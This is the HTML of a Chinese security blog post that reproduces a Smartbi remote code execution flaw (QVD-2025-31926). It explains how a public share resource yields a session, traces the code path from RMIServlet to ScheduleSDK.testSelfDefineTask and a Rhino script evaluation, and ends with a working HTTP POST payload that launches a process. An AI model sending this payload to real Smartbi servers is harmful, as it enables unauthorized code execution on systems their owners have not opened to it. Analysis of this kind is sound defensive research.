@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>smartbi远程代码执行漏洞复现(QVD-2025-31926) | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">smartbi远程代码执行漏洞复现(QVD-2025-31926)</h1>
+    <div class="post-meta">
+      <time datetime="2025-08-25">2025-08-25</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19056342">https://www.cnblogs.com/Zephyr07/articles/19056342</a></p>
+</blockquote>
+<h1 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h1><p>QVD-2025-31926</p>
+<p>XVE-2025-24290</p>
+<p>CNNVD-2025-50548456</p>
+<h1 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h1><p>Smartbi存在权限验证缺陷，攻击者可通过已知的默认资源ID绕过身份验证获取合法Session，然后在后台调用任意js代码达到远程代码的效果</p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="权限验证缺陷"><a href="#权限验证缺陷" class="headerlink" title="权限验证缺陷"></a>权限验证缺陷</h2><p>定位share_jsp.java</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095056388-501008763.png" alt="image"></p>
+<p>这块代码对应的是系统的中的分享资源的这一功能的</p>
+<blockquote>
+<p>这一功能我们平时也会经常见到就是分享共享链接的文档供别人打开</p>
+</blockquote>
+<p>主要定位在第一个try块代码中，这段代码的逻辑是根据传入的参数resid来判断对应的资源是否存在以及资源类型(公开还是非公开)</p>
+<p>问题出在最后一句代码</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095105284-1459105496.png" alt="image"></p>
+<p>当没有登录系统的用户访问一个公开资源的时候，他都会获得一个public的权限</p>
+<p>当你访问这个资源的时候，响应包就会返回一个public的session，问题就出在session是可以访问后面rce的路径</p>
+<h2 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h2><p>获取到后台用户的权限后即可通过调用特定类的特定方法传入特定参数后达到任意执行js代码</p>
+<p>来到RMIServlet.class类中</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095123480-1210498884.png" alt="image"></p>
+<p>在这一块代码中它支持用户可以外部传入className，methodName和params参数，并通过processExecute方法来执行对应类的对应方法</p>
+<p>所以按照之前分析反序列化的思路来看下一步就是需要在本地找一个类的方法可以执行任意代码</p>
+<p>找到的是ScheduleSDK类中的testSelfDefineTask方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095129890-449736655.png" alt="image"></p>
+<p>该方法传入的第四个参数script会被删除掉空格后设置到<code>selfDefineTaskBO</code>对象的<code>templateScript</code>属性中</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095136426-427564029.png" alt="image"></p>
+<p>看这个方法的最后发现他会把selfDefineTaskBO对象传入runTask方法中，跟入</p>
+<p>在runTask方法中，currentTask就是我们传入的selfDefineTaskBO对象，而下面这段代码是提交任务到线程池执行</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095143992-566575218.png" alt="image"></p>
+<ul>
+<li>初始化任务执行上下文（包含任务基本信息、时间参数等）</li>
+<li>提交任务到线程池异步执行（通过 <code>Callable</code>）</li>
+<li>处理任务执行过程中的各种异常（取消、执行错误等）</li>
+<li>记录任务执行结果（成功状态、耗时、消息）</li>
+</ul>
+<p>跟入call方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095153245-782552869.png" alt="image"></p>
+<p>在跟入executeV1方法，核心代码是这段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 执行 JS 脚本，返回结果</span><br><span class="line">    result = cx.evaluateString(scope, execScript, &quot;cmd&quot;, 1, (Object)null);</span><br><span class="line">&#125; catch (RhinoException var24) &#123;</span><br><span class="line">    // 处理脚本执行异常（如语法错误、运行时错误）</span><br><span class="line">    int line = var24.lineNumber(); // 错误行号</span><br><span class="line">    int col = var24.columnNumber(); // 错误列号</span><br><span class="line">    String txt = var24.getCause() == null ? var24.getMessage() : var24.getCause().getMessage();</span><br><span class="line">    // 构建详细错误消息（包含位置信息）</span><br><span class="line">    String errMsg = StringUtil.replaceLanguage(&quot;$&#123;Schedule_Run_Script_Error&#125;&quot;, locale) + txt + ...;</span><br><span class="line">    log.error(var24.getMessage(), var24);</span><br><span class="line">    throw (new SmartbiException(CommonErrorCode.DECLARE_METHOD_ERROR, var24)).setDetail(errMsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095200077-1543791652.png" alt="image"></p>
+<p>execscript就是最初传入的script参数，最终达到一个执行任意js代码</p>
+<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet HTTP/1.1</span><br><span class="line">Host: xxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: JSESSIONID=xxx; Hm_lvt_0febd9e3cacb3f627ddac64d52caac39=1754881386</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">className=ScheduleSDK&amp;methodName=testSelfDefineTask&amp;params=[&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;(new Packages.java.lang.ProcessBuilder(\&quot;calc.exe\&quot;)).start();&quot;,&quot;admin&quot;,&quot;&quot;]</span><br><span class="line">//JSESSIONID内容需要自己获取</span><br></pre></td></tr></table></figure>
+
+<p>漏洞复现：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250825095207653-2082538489.png" alt="image"></p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/08/26/%E9%AB%98%E7%89%88%E6%9C%ACJDK-SpringBoot%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E9%93%BE/" class="prev">← 高版本JDK+SpringBoot原生反序列化通杀链</a>
+    
+    
+      <a href="/2025/08/21/JDBC-MySQL%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" class="next">JDBC MySQL不出网利用 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
